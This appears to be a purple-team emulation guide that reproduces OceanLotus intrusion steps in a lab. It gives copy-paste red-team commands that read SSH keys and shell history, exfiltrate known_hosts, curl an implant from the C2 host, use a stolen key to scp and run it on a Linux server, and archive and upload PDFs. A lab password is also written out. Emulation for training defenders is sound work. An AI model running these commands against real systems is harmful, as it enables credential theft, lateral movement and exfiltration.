# 🌊💮 Emulation 
This scenario emulates OceanLotus TTPs based primarily on two malware specimens either 
used by or associated with the OceanLotus actors:

1. Rota Jakiro
1. OceanLotus.abcdef


### 🗺️ Legend
This document is intended to be used as a operational guide for a purple team operation. 

Based on the CTI Emulation Plan, each step includes the following information:
- 📖 **Overview** - Summuary of actions that are completed in this step
- 👾 **Red Team Procedures** - Red team operator instructions & commands to execute with expected output
- 🔮 **Reference Code & Reporting** - A table with links to the source code for specific actions with cited intelligence leveraged for this action (if available)
- 🔬 **Blue Team Notes** - key API calls, events, or telemtry for blue teams

In-line Symbols:
* :bulb: - callout notes
* :heavy_exclamation_mark: - extremely important note
* :arrow_right: - Switching to another session
* :o: - Sign out of something


---
## Step 0 - Operation Setup

### 📖 Overview
This step assumes you have completed the infrastructure [setup](../setup/README.md). At the end of this step a Red Team operator should be able to execute the emulation plan by copying and pasting the commands into the correct terminal window with all required programs running. 

Actions completed in this step:
- Login to the attacker Kali machine via SSH
- Start the control server
- Set up attacker terminal windows for execution
- Login to the macOS VM on AWS - Required for step 1

At the end of this step the Attacker C2 should be listening for the implant callback and the red team operator should have terminal windows set up to manage the operation. 

---
### 👾 Red Team Procedures

#### Kali Setup
Ensure OceanLotus GitHub repo is cloned to the Kali host and infrastrucre is set up according to the infrastructure.md (This includes ensure the handlers are configured correctly in the `config/handler_config.yml` file)

1. ssh to the Kali box hosting our C2 server in AWS
   ```
   ssh kali@10.90.30.26
   ```
   Expected Output:
   A login session as the kali user
   ```
   ┌──(kali㉿kali1)-[~]
   └─$
   ```
1. Start the C2 Server
   ```
   sudo ./controlServer
   ```


#### VNC Access to macOS
1. Setup SSH Tunnel to forward port 5900 to localhost (must use teh ec2-user for this part) 
   ```
   # The result should be an active SSH session, with port 5900 
   # on the Mac forwarded to port 5900 on your local machine.
   
   ssh -L 5900:localhost:5900 ec2-user@10.90.30.22
   ```
   The result should be an active SSH session, with port 5900 on the AWS macOS forwarded to port 5900 on your local machine.
   Expected Output: 
   ```
   Last login: <insert date from somewhere>
       ┌───┬──┐   __|  __|_  )
       │ ╷╭╯╷ │   _|  (     /
       │  └╮  │  ___|\___|___|
       │ ╰─┼╯ │  Amazon EC2
       └───┴──┘  macOS Catalina 10.15.7
   ```
1. On a macOS, connect over VNC for a GUI intereface
   ```
   open vnc://localhost:5900
   ```
1. Enter the Hope Potter's credentials
   Username
   ```
   hpotter
   ```
   Password
   ```
   noax3teenohb~e
   ```
   Expected output:
   A GUI interface to the Mac Mini should appear on the screen. 

1. Enter the password manually
1. Verify the conkylan.app file (unicorn in Vietnamese) resides on the downloads folder. 

## Step 1 - It began with a double-click
### 📖 Overview
👋 Handwaving: Assume the user downloaded the conkylan.app (unicorn in Vietnamese) and it  resides on the user's `Downloads` folder. 

The user double-clicks the conkylan.app (note: We were not able to implement the homoglyph file extension due to updates from by apple 🙌 🍎) thinking it's a normal document. 

---
### 👾 Red Team Procedures
- Double click the conkylan.app
Confirm C2 Registration of the OSX implant 
### 🔮 Reference Code & Reporting
<br>

### 🔬 Blue Team Notes
<br>

## Step 2 - Discovery on macOS
### 📖 Overview
Discovery on MacOS host:
ssh keys
known hosts
history

---
### 👾 Red Team Procedures

Confirm an SSH key is in /.ssh folder
```zsh
./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/.ssh/"}'
```
 
Exfil Known Host file
```zsh
./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_upload_file", "arg":"/Users/hpotter/.ssh/known_hosts"}'
 ```

Look for SCP commands in history file - print out
```zsh
./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"cat /Users/hpotter/.bash_history"}'
```

Expected output: 
```
```

### 🔮 Reference Code & Reporting
<br>

### 🔬 Blue Team Notes
<br>

## Step 3 - Deploy Rota Jakiro
### 📖 Overview
Identified the macOS connects to a Linux file server. 
 
Download Rota Jakiro and scp Rota Jakiro to the Linux server
 
Execute Rota Jakiro

---
### 👾 Red Team Procedures
Task OceanLotus to download Rota Jakiro to the macOS Host
```
./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_download_file", "payload":"rota"}'
```

Veify the file downloaded
```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
```

>If that doesn't work do the following...
>  On the C2 server:
>  ```
>  cd /opt/oceanlotus/Resources/payloads
>  python3 -m http.server
>  ```
>  Task the implant
>  ```
>  ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
>  ```
>  
>  Veify the file downloaded
>  ```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
>  ```

Task OceanLotus to SCP the Rota Jakiro implant to the Linux host
```
./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"scp -i /Users/hpotter/.ssh/id_rsa /tm
p/rota hpotter@viserion.com@10.90.30.7:/tmp/rota"}'
```

Use OceanLotus to Execute Rota Jakiro on the Lotus host using ssh
```
./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\""}'
```

Confirm C2 Registration of Rota on the C2 Server

### 🔮 Reference Code & Reporting
<br>

### 🔬 Blue Team Notes
<br>


## Step 4 - Discovery on Linux Host
### 📖 Overview
Discover on Linux Host: 
Upload device info

---
### 👾 Red Team Procedures
`./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\""}'`

Confirm device info is printed out

### 🔮 Reference Code & Reporting
<br>

### 🔬 Blue Team Notes
<br>


## Step 5 - Collection
### 📖 Overview
Execute a shared object that includes: 
create tmp.rota folder 
move everything into the folder that is a .pdf extension 
tar all the .pdfs in the folder (exilf.tar.gz)
Confirm files were created

---
### 👾 Red Team Procedures
Execute:

run file query command, ensure files & folder exist 
Confirm: 
`./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_query_file", "arg": "/tmp/.rota/exfil.tar.gz"}'`

### 🔮 Reference Code & Reporting
<br>

### 🔬 Blue Team Notes
<br>


## Step 6 - Exfil from Linux Host
### 📖 Overview
Execute another shared object that includes: 
Uploading the tar file from the folder

---
### 👾 Red Team Procedures
`./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_upload_file", "payload": "payload.so"}'`
Confirm upload of file to server 

### 🔮 Reference Code & Reporting
<br>

### 🔬 Blue Team Notes
<br>


:red_circle: End of Scenario. 
